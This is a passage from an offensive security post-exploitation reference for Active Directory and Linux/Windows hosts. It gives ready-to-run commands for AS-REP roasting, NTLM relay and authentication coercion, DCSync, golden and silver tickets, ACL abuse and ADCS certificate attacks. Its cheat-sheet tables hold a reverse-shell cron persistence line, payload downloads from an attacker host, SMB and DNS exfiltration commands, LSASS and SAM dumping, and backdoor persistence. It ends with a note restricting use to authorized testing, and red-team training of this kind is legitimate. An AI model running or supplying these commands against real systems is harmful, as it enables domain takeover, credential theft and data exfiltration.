Targets accounts where Kerberos pre-authentication is disabled. Attacker requests AS-REP without valid credentials — response encrypted with user's NTLM hash, enabling offline crack.

```bash
# Impacket GetNPUsers — enumerate without pre-auth + request hashes
python3 GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip DC_IP -format hashcat -outputfile asrep.txt
python3 GetNPUsers.py corp.local/user:Password1! -dc-ip DC_IP -request -format hashcat    # authenticated
python3 GetNPUsers.py corp.local/ -no-pass -usersfile users.txt -dc-ip DC_IP    # unauthenticated spray
```

```cmd
:: Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
Rubeus.exe asreproast /user:targetuser /format:hashcat
```

```powershell
# PowerView
Get-DomainUser -PreauthNotRequired -Properties samaccountname | Invoke-ASREPRoast -Format Hashcat
```

```bash
# Crack with hashcat (mode 18200 = AS-REP)
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.txt rockyou.txt -r rules/best64.rule

# John
john --wordlist=rockyou.txt --format=krb5asrep asrep.txt
```

---

### 13.4 NTLM Relay Attacks

#### Responder + ntlmrelayx

```bash
# Step 1: Start Responder in capture mode (disable HTTP and SMB to allow relay)
responder -I eth0 -rdw
# -r = disable DNS, -d = disable DHCP, -w = start WPAD rogue proxy
# Disable SMB and HTTP in /etc/responder/Responder.conf: SMB = Off, HTTP = Off

# Step 2: Start ntlmrelayx pointing at targets
# targets.txt = list of IPs where SMB signing is disabled
ntlmrelayx.py -tf targets.txt -smb2support

# Execute command on relay success
ntlmrelayx.py -tf targets.txt -smb2support -c "powershell -enc BASE64PAYLOAD"

# Interactive SMB shell on relay success
ntlmrelayx.py -tf targets.txt -smb2support -i
# Then: nc 127.0.0.1 [port_shown]

# Dump SAM on all relay targets automatically
ntlmrelayx.py -tf targets.txt -smb2support --sam
```

```bash
# LDAP relay — escalate user privileges on DC
ntlmrelayx.py -tf dc_ip.txt -smb2support -t ldap://DC_IP --escalate-user lowpriv_user

# HTTP → LDAP relay (for web-triggered NTLM auth)
ntlmrelayx.py -t ldap://DC_IP --escalate-user lowpriv_user
```

#### LLMNR / NBT-NS Poisoning

```bash
# Analyze mode — detect but don't capture
responder -I eth0 -A

# Capture mode — poison and harvest NTLMv2 hashes
responder -I eth0

# Verbose mode
responder -I eth0 -v

# Check captured hashes
cat /usr/share/responder/logs/Responder-Session.log
ls /usr/share/responder/logs/*.txt
```

```bash
# Crack captured NTLMv2 hashes (mode 5600)
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt
john --wordlist=rockyou.txt --format=netntlmv2 captured_hashes.txt
```

#### Authentication Coercion (PetitPotam / PrinterBug)

```bash
# PrinterBug (SpoolSample) — forces DC to authenticate to attacker
python3 printerbug.py 'corp.local/user:Password1!'@DC_IP attacker_ip

# PetitPotam — newer coercion via EfsRpc (works unauth in some configs)
python3 PetitPotam.py -u user -p Password1! -d corp.local attacker_ip DC_IP
python3 PetitPotam.py attacker_ip DC_IP    # unauthenticated

# Combine with ntlmrelayx targeting ADCS HTTP enrollment (ESC8)
ntlmrelayx.py -t http://ADCS_IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# Forces DC to authenticate → relay to ADCS → get DC certificate → dcsync
```

---

### 13.5 DCSync

Requires Replication rights (Domain Admin, Enterprise Admin, or specifically granted via ACL).

```cmd
:: Mimikatz — dump single user
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" "exit"
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:Administrator" "exit"

:: Dump all accounts
mimikatz.exe "lsadump::dcsync /domain:corp.local /all /csv" "exit"
mimikatz.exe "privilege::debug" "lsadump::lsa /patch" "exit"    :: local LSA dump
```

```bash
# Impacket secretsdump from Linux
python3 secretsdump.py corp.local/DomainAdmin:'Password1!'@DC_IP
python3 secretsdump.py corp.local/DomainAdmin@DC_IP -hashes :NTLM_HASH
python3 secretsdump.py corp.local/DomainAdmin:'Pass'@DC_IP -just-dc-ntlm    # NTLM only
python3 secretsdump.py corp.local/DomainAdmin:'Pass'@DC_IP -just-dc-user krbtgt
python3 secretsdump.py corp.local/DomainAdmin:'Pass'@DC_IP -outputfile domain_hashes
```

---

### 13.6 Kerberos Ticket Attacks

#### Pass-the-Ticket

```cmd
:: List current tickets
klist

:: Rubeus — dump all tickets
Rubeus.exe dump
Rubeus.exe dump /luid:0x1234 /service:krbtgt    :: specific logon session

:: Import ticket
Rubeus.exe ptt /ticket:base64ticket==
Rubeus.exe ptt /ticket:C:\temp\ticket.kirbi

:: Mimikatz — export all tickets
mimikatz.exe "kerberos::list /export" "exit"

:: Import in Mimikatz
mimikatz.exe "kerberos::ptt C:\temp\ticket.kirbi" "exit"

:: Use imported ticket
dir \\dc01\C$
klist    :: verify ticket loaded
```

#### Overpass-the-Hash (NTLM Hash → TGT)

```cmd
:: Mimikatz — spawn process with NTLM hash, get Kerberos TGT
mimikatz.exe "sekurlsa::pth /user:admin /domain:corp.local /ntlm:HASH_HERE /run:cmd.exe" "exit"

:: Rubeus — ask for TGT directly
Rubeus.exe asktgt /user:admin /rc4:NTLM_HASH /domain:corp.local /dc:DC_IP /ptt
Rubeus.exe asktgt /user:admin /aes256:AES_HASH /domain:corp.local /dc:DC_IP /ptt
```

#### Golden Ticket

Forges a TGT using the KRBTGT account hash. Valid for 10 years by default. Survives user password changes; only invalidated by rotating KRBTGT password twice.

```cmd
:: Requirements: KRBTGT hash + Domain SID
:: Get domain SID:
whoami /all    :: look for S-1-5-21-...
Get-DomainSID  :: PowerView
wmic useraccount get name,sid | findstr Administrator

:: Mimikatz golden ticket
mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /krbtgt:KRBTGT_HASH /id:500 /ptt" "exit"

:: With specific groups (add Extra SIDs for forest trust escalation)
mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXX /krbtgt:HASH /id:500 /groups:512,513,518,519,520 /ptt" "exit"

:: Save to file instead of inject
mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXX /krbtgt:HASH /id:500 /ticket:golden.kirbi" "exit"
```

```cmd
:: Rubeus golden ticket
Rubeus.exe golden /rc4:KRBTGT_HASH /domain:corp.local /sid:S-1-5-21-XXXX /user:Administrator /ptt
Rubeus.exe golden /aes256:AES256_KRBTGT /domain:corp.local /sid:S-1-5-21-XXXX /user:Administrator /ptt
```

#### Silver Ticket

Forges a TGS for a specific service using the service account's hash. More stealthy — no DC contact needed during use.

```cmd
:: Mimikatz silver ticket — target CIFS service on fileserver
mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXX /target:fileserver.corp.local /service:cifs /rc4:SERVICE_ACCOUNT_HASH /ptt" "exit"

:: Common service targets:
:: cifs    = file shares (\\server\share)
:: http    = IIS/web applications
:: host    = scheduled tasks, WMI, RDP
:: wsman   = WinRM / PowerShell remoting
:: ldap    = LDAP queries
:: mssqlsvc = SQL Server

:: Example: HOST service for scheduled tasks
mimikatz.exe "kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-21-XXXX /target:dc01.corp.local /service:host /rc4:HASH /ptt" "exit"
```

---

### 13.7 ACL / ACE Abuse

Common exploitable rights discovered via BloodHound or PowerView:

**GenericAll on a user — full control:**

```powershell
# Force password change
Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString "NewPass1!" -AsPlainText -Force) -Verbose

# Targeted Kerberoast — add SPN to account, then kerberoast
Set-DomainObject -Identity target_user -Set @{serviceprincipalname='fake/spn'} -Verbose
Invoke-Kerberoast -Identity target_user -OutputFormat Hashcat
# Remove SPN after:
Set-DomainObject -Identity target_user -Clear serviceprincipalname
```

**GenericWrite on a group — add member:**

```powershell
Add-DomainGroupMember -Identity "Domain Admins" -Members current_user -Verbose
Get-DomainGroupMember "Domain Admins"    # verify
```

**WriteDACL on domain — grant DCSync:**

```powershell
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity current_user \
  -Rights DCSync -Verbose
# Now run DCSync as current_user
```

**AddMember right:**

```powershell
net group "Domain Admins" current_user /add /domain
Add-DomainGroupMember -Identity "Domain Admins" -Members current_user
```

**ForceChangePassword:**

```powershell
# Set-DomainUserPassword (as above)
# Or via net rpc (from Linux):
net rpc password target_user 'NewPassword1!' -U corp.local/current_user%'CurrentPass' -S DC_IP
```

**Shadow Credentials (WriteProperty / GenericWrite on msDS-KeyCredentialLink):**

```cmd
:: Whisker.exe — add shadow credential to target user
Whisker.exe add /target:target_user

:: Outputs Rubeus command to request TGT using certificate:
Rubeus.exe asktgt /user:target_user /certificate:BASE64CERT /password:CERTPASS /domain:corp.local /dc:DC_IP /ptt
```

---

### 13.8 ADCS Attacks

```bash
# Enumerate vulnerable templates from Linux
certipy find -u user -p 'Password1!' -dc-ip DC_IP -vulnerable -stdout
certipy find -u user -p 'Password1!' -dc-ip DC_IP -enabled -stdout

# From Windows
Certify.exe find /vulnerable
Certify.exe find /vulnerable /currentuser
```

**ESC1 — SAN abuse (enroll as any user):**

```bash
# Request certificate with alternative Subject Alternative Name (admin)
certipy req -u user -p 'Pass' -dc-ip DC_IP -target CA_HOST -ca CA_NAME -template VulnTemplate -upn administrator@corp.local
# Outputs: administrator.pfx

# Authenticate and get NTLM hash
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

```cmd
:: Windows
Certify.exe request /ca:CA_HOST\CA_NAME /template:VulnTemplate /altname:administrator
# Outputs PEM certificate — convert to PFX:
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out admin.pfx

:: Use with Rubeus for TGT
Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /password:certpass /ptt
```

**ESC4 — Vulnerable template ACL:**

```bash
# If write access to template, modify to ESC1:
certipy template -u user -p 'Pass' -dc-ip DC_IP -template VulnTemplate -save-old
certipy template -u user -p 'Pass' -dc-ip DC_IP -template VulnTemplate -configuration EnableSAN
# Then exploit as ESC1
# Restore template after:
certipy template -u user -p 'Pass' -dc-ip DC_IP -template VulnTemplate -configuration saved_config
```

**ESC8 — NTLM relay to ADCS HTTP enrollment:**

```bash
# Start ntlmrelayx targeting ADCS
ntlmrelayx.py -t http://CA_HOST/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce DC authentication (PetitPotam or PrinterBug)
python3 PetitPotam.py attacker_ip DC_IP -u user -p 'Pass' -d corp.local

# ntlmrelayx receives DC authentication, relays to ADCS, outputs DC certificate
# Use certipy to authenticate with certificate and get NTLM hash:
certipy auth -pfx dc.pfx -dc-ip DC_IP
# Then: secretsdump with NTLM hash
python3 secretsdump.py -hashes :DC_NTLM_HASH 'corp.local/DC$'@DC_IP
```

---

## Quick Reference: Post-Exploitation Cheatsheet

### Linux Quick Reference

| Task | Command | Notes |
|------|---------|-------|
| Current user context | `id && whoami && groups` | Check for interesting groups (sudo, docker, lxd, adm) |
| System info | `uname -a && cat /etc/os-release` | Kernel version drives exploit selection |
| Network interfaces | `ip a && ip route && ss -tulnp` | Look for internal-only interfaces |
| Listening services | `ss -tulnp` | Internal listeners often have weak auth |
| All users | `cat /etc/passwd` | UID 0 = root equivalent |
| Shadow file | `cat /etc/shadow` | Check if world-readable |
| Running processes | `ps aux` | Look for root processes calling writable scripts |
| Cron jobs | `cat /etc/crontab; ls /etc/cron.d/` | Root crons calling writable files = easy escalation |
| SUID binaries | `find / -perm -4000 -type f 2>/dev/null` | Any non-standard SUID → check GTFOBins |
| Sudo rights | `sudo -l` | NOPASSWD entries are direct escalation paths |
| Capabilities | `getcap -r / 2>/dev/null` | cap_setuid on python/perl = instant root |
| Writable dirs | `find / -writable -type d 2>/dev/null` | PATH hijacking and cron abuse |
| Find passwords | `grep -rsi "password\|passwd\|secret" /var/www/ /opt/ 2>/dev/null` | Web app configs often have DB credentials |
| SSH keys | `find / -name "id_rsa" 2>/dev/null` | Reuse across hosts |
| History files | `cat ~/.bash_history ~/.mysql_history` | Commands with inline passwords |
| Docker group | `id \| grep docker` | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` |
| NFS no_root_squash | `cat /etc/exports` | Mount from attacker root, place SUID binary |
| Kernel version check | `uname -r` | Match to DirtyCow/PwnKit/DirtyPipe |
| Linux privesc suggester | `./linux-exploit-suggester.sh` | Automated kernel exploit enumeration |
| Cron persistence | `(crontab -l; echo "*/5 * * * * /bin/bash -i >& /dev/tcp/IP/PORT 0>&1") \| crontab -` | User-level, no root needed |
| SSH backdoor | `echo "PUBKEY" >> ~/.ssh/authorized_keys` | Survives password changes |
| SUID bash | `chmod +s /bin/bash; bash -p` | Requires root to set SUID |
| Lateral via SSH tunnel | `ssh -D 1080 -N user@pivot` | SOCKS proxy via compromised host |
| Transparent proxy | `sshuttle -r user@pivot 10.0.0.0/8` | Route all traffic through pivot |

---

### Windows Quick Reference

| Task | Command | Notes |
|------|---------|-------|
| Current user + privileges | `whoami /all` | SeImpersonatePrivilege = Potato to SYSTEM |
| System info | `systeminfo` | OS version, hotfixes, domain membership |
| Network | `ipconfig /all && netstat -ano` | Multi-homed hosts indicate pivot potential |
| Domain info | `net group "Domain Admins" /domain` | Confirm DA membership |
| Running processes | `tasklist /v` | Identify EDR/AV, privilege processes |
| Installed software | `wmic product get name,version` | Outdated software = unpatched CVEs |
| Scheduled tasks | `schtasks /query /fo LIST /v` | Tasks running as SYSTEM with writable binaries |
| Services + paths | `wmic service get name,pathname,startname` | Unquoted paths, weak permissions |
| Unquoted service paths | `wmic service get name,pathname \| findstr /i /v """" \| findstr /i /v "C:\Windows"` | Write malicious binary at space-split path |
| AlwaysInstallElevated | `reg query HKLM\...\Installer /v AlwaysInstallElevated` | Both HKLM+HKCU=1 → SYSTEM via MSI |
| SeImpersonatePrivilege | `whoami /priv \| findstr Impersonate` | PrintSpoofer/GodPotato → SYSTEM |
| UAC bypass | `fodhelper.exe` HKCU registry hijack | No file write, no admin needed |
| LSASS dump | `rundll32 comsvcs.dll, MiniDump [PID] C:\temp\lsass.dmp full` | Built-in method, no extra tools |
| SAM hive | `reg save HKLM\SAM C:\temp\sam` | Offline crack with secretsdump |
| PS history | `cat $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` | Inline passwords common |
| Credential manager | `cmdkey /list` | Stored RDP/network credentials |
| Find password files | `dir /s /b *password* *credential* unattend.xml 2>nul` | Unattend.xml has cleartext creds |
| Pass-the-Hash | `psexec.py domain/user@target -hashes :NTLM` | Works even if cleartext unknown |
| WinRM lateral | `evil-winrm -i target -u user -H NTLM` | Requires WinRM open (5985/5986) |
| Enable RDP | `reg add "HKLM\...\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f` | Then add firewall rule |
| Registry persistence | `reg add HKCU\...\Run /v svc /t REG_SZ /d "C:\temp\p.exe" /f` | User-level, no admin |
| Scheduled task persist | `schtasks /create /tn "svc" /tr "C:\temp\p.exe" /sc onlogon /f` | Survives reboots |
| SYSTEM service | `sc create svc binpath= "C:\temp\p.exe" start= auto` | Requires admin |
| WMI persistence | PowerShell `__FilterToConsumerBinding` | Fileless, survives reboots, hard to detect |
| Download to target | `(New-Object Net.WebClient).DownloadFile("http://attacker/f.exe","C:\t\f.exe")` | DownloadString for in-memory |
| Exfil via SMB | `net use \\attacker\share; copy sensitive.zip \\attacker\share\` | Fast, reliable |
| DNS exfil | `nslookup [base64].attacker.com attacker_dns` | For heavily filtered egress |
| Kerberoasting | `Rubeus.exe kerberoast /outfile:hashes.txt` | Crack with hashcat -m 13100 |
| ASREPRoasting | `Rubeus.exe asreproast /format:hashcat` | Crack with hashcat -m 18200 |
| DCSync | `mimikatz "lsadump::dcsync /domain:corp /user:krbtgt" exit` | Requires DA or replication rights |
| Golden ticket | `mimikatz "kerberos::golden /user:Admin /domain:corp /sid:S-1-5-... /krbtgt:HASH /ptt" exit` | 10-year TGT, survives user pass changes |
| BloodHound collect | `SharpHound.exe -c All --outputdirectory C:\temp` | Import ZIP into BloodHound neo4j |
| NTLM relay | `responder -I eth0 -rdw` + `ntlmrelayx.py -tf targets.txt -smb2support` | SMB signing disabled required |

---

*End of Part 2 — Post-Exploitation Reference*
*All techniques sourced from public security research, CVE databases, and open-source tooling.*
*For use only on systems with explicit written authorization.*
